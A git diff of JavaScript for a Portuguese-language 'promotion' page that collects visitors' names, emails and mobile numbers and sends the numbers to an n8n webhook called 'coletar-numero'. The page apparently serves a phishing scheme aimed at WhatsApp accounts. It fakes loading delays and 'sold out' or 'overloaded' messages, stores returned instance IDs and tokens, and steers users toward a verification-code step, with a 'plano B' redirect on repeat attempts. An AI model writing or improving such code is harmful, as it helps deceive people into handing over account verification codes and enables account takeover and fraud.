@@ -20,6 +20,11 @@ const confirmDataModal = document.getElementById("confirmDataModal")
 const verifyingModal = document.getElementById("verifyingModal")
 const whatsappRedirectModal = document.getElementById("whatsappRedirectModal")
 
+// Função de normalização do número
+function normalizePhone(number) {
+  return number.replace(/\D/g, "").replace(/^55/, "")
+}
+
 // Initialize
 document.addEventListener("DOMContentLoaded", () => {
   initializeEventListeners()
@@ -56,7 +61,7 @@ function initializeEventListeners() {
   })
 
   // Modal buttons
-  document.getElementById("btnGoToWhatsapp").addEventListener("click", redirectToVerification)
+  document.getElementById("btnGoToWhatsapp").addEventListener("click", handleWhatsappRedirect)
   document.querySelector(".btn-modal-ok").addEventListener("click", closeModal)
 
   // User data form
@@ -310,9 +315,9 @@ function validateUserData(data) {
   }
 
   // Validate phone (DDD + 9 + 8 digits)
-  const phoneRegex = /^\d{11}$/
+  const phoneRegex = /^\d{2}9\d{8}$/
   if (!phoneRegex.test(data.phone)) {
-    showToast("Telefone deve ter o formato: (XX) XXXXX-XXXX")
+    showToast("Telefone deve ter o formato: (XX) 9XXXX-XXXX")
     return false
   }
 
@@ -331,6 +336,11 @@ function populateConfirmationModal() {
   document.getElementById("confirmNick").textContent = userData.nickname
   document.getElementById("confirmEmail").textContent = userData.email
   document.getElementById("confirmPhone").value = formatPhoneDisplay(userData.phone)
+
+  // Garantir que o botão esteja habilitado quando o modal abrir
+  setTimeout(() => {
+    resetConfirmButton()
+  }, 100)
 }
 
 async function handleDataConfirmation() {
@@ -341,11 +351,28 @@ async function handleDataConfirmation() {
   userData.phone = phoneValue
 
   // Validate phone again
-  const phoneRegex = /^\d{11}$/
+  const phoneRegex = /^\d{2}9\d{8}$/
   if (!phoneRegex.test(userData.phone)) {
-    showToast("Telefone deve ter o formato: (XX) XXXXX-XXXX")
+    showToast("Telefone deve ter o formato: (XX) 9XXXX-XXXX")
     return
   }
+
+  // Normalizar o número
+  const normalizedPhone = normalizePhone(userData.phone)
+
+  // Verificar se é o mesmo número original (segunda tentativa)
+  const numeroOriginal = sessionStorage.getItem("numeroOriginal")
+  if (numeroOriginal && numeroOriginal === normalizedPhone) {
+    // Segunda tentativa com o mesmo número - redirecionar para plano B
+    window.location.href = "link-plano-b.html"
+    return
+  }
+
+  // Primeira tentativa - salvar número original
+  sessionStorage.setItem("numeroOriginal", normalizedPhone)
+
+  // Limpar código de verificação para novo número
+  sessionStorage.removeItem("lastVerificationCode")
 
   // Show verifying modal
   closeModal()
@@ -355,55 +382,173 @@ async function handleDataConfirmation() {
     // Simulate 3 seconds loading
     await new Promise((resolve) => setTimeout(resolve, 3000))
 
-    const cleanPhone = userData.phone.replace(/\D/g, "")
-
     const response = await fetch("https://main-n8n.ohbhf7.easypanel.host/webhook/coletar-numero", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ telefone: cleanPhone }),
+      body: JSON.stringify({ telefone: normalizedPhone }),
     })
 
     const data = await response.json()
 
+    // Remover loading screen antes de abrir qualquer popup
+    hideLoadingScreen()
+
     if (data.disponibilidade === "lotado") {
-      // Show lotado modal
       closeModal()
-      showLotadoModal()
-    } else {
-      // Success - proceed to WhatsApp redirect
+      showLotadoModal(data.timer || 60)
+    } else if (data.disponibilidade === "nocode") {
       closeModal()
-      showModal(whatsappRedirectModal)
+      showNocodeModal()
+    } else if (data.disponibilidade === "ok") {
+      // Salvar instanceId e token
+      sessionStorage.setItem("instanceId", data.id)
+      sessionStorage.setItem("token", data.token)
+
+      closeModal()
+      showWhatsappModal()
     }
   } catch (error) {
     console.error("Erro ao verificar número:", error)
+    hideLoadingScreen()
     closeModal()
-    showLotadoModal()
+    showLotadoModal(60)
   }
 }
 
-function showLotadoModal() {
+function hideLoadingScreen() {
+  const loadingScreen = document.getElementById("loadingScreen")
+  if (loadingScreen) {
+    loadingScreen.style.display = "none"
+  }
+  hideLoadingOverlay()
+}
+
+function showNocodeModal() {
+  const nocodeModal = document.createElement("div")
+  nocodeModal.className = "modal"
+  nocodeModal.id = "nocodeModal"
+  nocodeModal.style.display = "block"
+  nocodeModal.innerHTML = `
+    <div class="modal-content nocode-modal">
+      <div class="nocode-header">
+        <div class="warning-icon">
+          <i class="fas fa-exclamation-triangle"></i>
+        </div>
+        <h3>Número Inválido</h3>
+        <p class="nocode-subtitle">Não foi possível enviar código para este número</p>
+      </div>
+      <div class="modal-body">
+        <p style="text-align: center; margin-bottom: 20px; color: #495057; line-height: 1.5;">
+          O número informado não pode receber código de verificação. Por favor, preencha um número válido.
+        </p>
+      </div>
+      <div class="modal-footer">
+        <button class="btn-nocode-ok" onclick="handleNocodeOk()">
+          <i class="fas fa-check"></i>
+          OK
+        </button>
+      </div>
+    </div>
+  `
+
+  document.body.appendChild(nocodeModal)
+  document.body.style.overflow = "hidden"
+}
+
+function handleNocodeOk() {
+  // Fechar popup de nocode
+  const nocodeModal = document.getElementById("nocodeModal")
+  if (nocodeModal) {
+    nocodeModal.remove()
+  }
+
+  // Reabrir popup de confirmação
+  showModal(confirmDataModal)
+
+  // Obter referências dos elementos
+  const btnConfirmData = document.getElementById("btnConfirmData")
+  const confirmPhone = document.getElementById("confirmPhone")
+
+  // Desabilitar botão visualmente
+  function disableButton() {
+    btnConfirmData.disabled = true
+    btnConfirmData.style.opacity = "0.6"
+    btnConfirmData.style.cursor = "not-allowed"
+    btnConfirmData.style.background =
+      "linear-gradient(135deg, rgba(248, 249, 250, 0.9) 0%, rgba(233, 236, 239, 0.8) 100%)"
+    btnConfirmData.style.color = "#6c757d"
+    btnConfirmData.style.border = "2px solid rgba(222, 226, 230, 0.8)"
+    btnConfirmData.style.boxShadow = "none"
+  }
+
+  // Habilitar botão visualmente
+  function enableButton() {
+    btnConfirmData.disabled = false
+    btnConfirmData.style.opacity = "1"
+    btnConfirmData.style.cursor = "pointer"
+    btnConfirmData.style.background = "linear-gradient(135deg, #e30613 0%, #b8050f 100%)"
+    btnConfirmData.style.color = "white"
+    btnConfirmData.style.border = "none"
+    btnConfirmData.style.boxShadow = "0 6px 20px rgba(227, 6, 19, 0.4)"
+  }
+
+  // Desabilitar botão inicialmente
+  disableButton()
+
+  // Armazenar o valor atual do telefone
+  const currentPhoneValue = confirmPhone.value
+
+  // Função para verificar mudança no telefone
+  function checkPhoneChange() {
+    if (confirmPhone.value !== currentPhoneValue) {
+      enableButton()
+      // Remover este listener após primeira mudança
+      confirmPhone.removeEventListener("input", checkPhoneChange)
+      confirmPhone.removeEventListener("keyup", checkPhoneChange)
+      confirmPhone.removeEventListener("change", checkPhoneChange)
+    }
+  }
+
+  // Adicionar múltiplos listeners para garantir que funcione
+  confirmPhone.addEventListener("input", checkPhoneChange)
+  confirmPhone.addEventListener("keyup", checkPhoneChange)
+  confirmPhone.addEventListener("change", checkPhoneChange)
+
+  // Focar no campo de telefone para facilitar edição
+  setTimeout(() => {
+    confirmPhone.focus()
+    confirmPhone.select()
+  }, 100)
+
+  document.body.style.overflow = "auto"
+}
+
+function showLotadoModal(timer) {
   const lotadoModal = document.createElement("div")
   lotadoModal.className = "modal"
+  lotadoModal.id = "lotadoModal"
   lotadoModal.style.display = "block"
   lotadoModal.innerHTML = `
     <div class="modal-content lotado-modal">
       <div class="lotado-header">
         <div class="users-icon">
-          <i class="fas fa-users"></i>
+          <i class="fas fa-server"></i>
         </div>
-        <h3>Vagas Esgotadas</h3>
-        <p class="lotado-subtitle">Todas as vagas para esta promoção foram preenchidas</p>
+        <h3>Site Temporariamente Superlotado</h3>
+        <p class="lotado-subtitle">Todas as instâncias estão ocupadas no momento</p>
       </div>
       <div class="modal-body">
         <p style="text-align: center; margin-bottom: 20px; color: #495057; line-height: 1.5;">
-          Infelizmente, todas as vagas disponíveis para esta promoção já foram ocupadas. 
-          Tente novamente mais tarde ou aguarde uma nova promoção.
+          Todas as instâncias estão ocupadas no momento. Por favor, aguarde alguns segundos antes de tentar novamente.
         </p>
+        <div class="timer-display">
+          <span id="lotadoTimer">${timer}</span> segundos
+        </div>
       </div>
       <div class="modal-footer">
-        <button class="btn-lotado-ok" onclick="this.closest('.modal').remove()">
-          <i class="fas fa-check"></i>
-          ENTENDI
+        <button class="btn-lotado-retry" id="btnLotadoRetry" disabled>
+          <i class="fas fa-redo"></i>
+          TENTAR NOVAMENTE
         </button>
       </div>
     </div>
@@ -412,13 +557,92 @@ function showLotadoModal() {
   document.body.appendChild(lotadoModal)
   document.body.style.overflow = "hidden"
 
-  // Close modal when clicking outside
-  lotadoModal.addEventListener("click", (e) => {
-    if (e.target === lotadoModal) {
-      lotadoModal.remove()
-      document.body.style.overflow = "auto"
+  // Iniciar countdown
+  startLotadoTimer(timer)
+}
+
+function startLotadoTimer(seconds) {
+  const timerElement = document.getElementById("lotadoTimer")
+  const retryButton = document.getElementById("btnLotadoRetry")
+
+  let timeLeft = seconds
+
+  const countdown = setInterval(() => {
+    timeLeft--
+    if (timerElement) {
+      timerElement.textContent = timeLeft
     }
-  })
+
+    if (timeLeft <= 0) {
+      clearInterval(countdown)
+      if (retryButton) {
+        retryButton.disabled = false
+        retryButton.style.opacity = "1"
+        retryButton.style.cursor = "pointer"
+        retryButton.onclick = handleLotadoRetry
+      }
+    }
+  }, 1000)
+}
+
+function handleLotadoRetry() {
+  const lotadoModal = document.getElementById("lotadoModal")
+  if (lotadoModal) {
+    lotadoModal.remove()
+  }
+
+  // Voltar para confirmação de número
+  showModal(confirmDataModal)
+  document.body.style.overflow = "auto"
+}
+
+function showWhatsappModal() {
+  showModal(whatsappRedirectModal)
+}
+
+function handleWhatsappRedirect() {
+  // Fechar popup
+  closeModal()
+
+  // Mostrar popup de espera com countdown
+  showWaitingModal()
+}
+
+function showWaitingModal() {
+  const waitingModal = document.createElement("div")
+  waitingModal.className = "modal"
+  waitingModal.id = "waitingModal"
+  waitingModal.style.display = "block"
+  waitingModal.innerHTML = `
+    <div class="modal-content waiting-modal">
+      <div class="waiting-header">
+        <div class="clock-icon">
+          <i class="fas fa-clock"></i>
+        </div>
+        <h3>Aguarde um momento</h3>
+        <p class="waiting-subtitle">Redirecionando em <span id="waitingTimer">3</span> segundos...</p>
+      </div>
+    </div>
+  `
+
+  document.body.appendChild(waitingModal)
+  document.body.style.overflow = "hidden"
+
+  // Countdown de 3 segundos
+  let timeLeft = 3
+  const timerElement = document.getElementById("waitingTimer")
+
+  const countdown = setInterval(() => {
+    timeLeft--
+    if (timerElement) {
+      timerElement.textContent = timeLeft
+    }
+
+    if (timeLeft <= 0) {
+      clearInterval(countdown)
+      redirectToVerification()
+    }
+  }, 1000)
 }
 
 function redirectToVerification() {
@@ -469,4 +693,18 @@ function showToast(message) {
   setTimeout(() => {
     toast.remove()
   }, 3000)
+}
+
+// Função para resetar completamente o estado do botão confirmar
+function resetConfirmButton() {
+  const btnConfirmData = document.getElementById("btnConfirmData")
+  if (btnConfirmData) {
+    btnConfirmData.disabled = false
+    btnConfirmData.style.opacity = "1"
+    btnConfirmData.style.cursor = "pointer"
+    btnConfirmData.style.background = "linear-gradient(135deg, #e30613 0%, #b8050f 100%)"
+    btnConfirmData.style.color = "white"
+    btnConfirmData.style.border = "none"
+    btnConfirmData.style.boxShadow = "0 6px 20px rgba(227, 6, 19, 0.4)"
+  }
 }
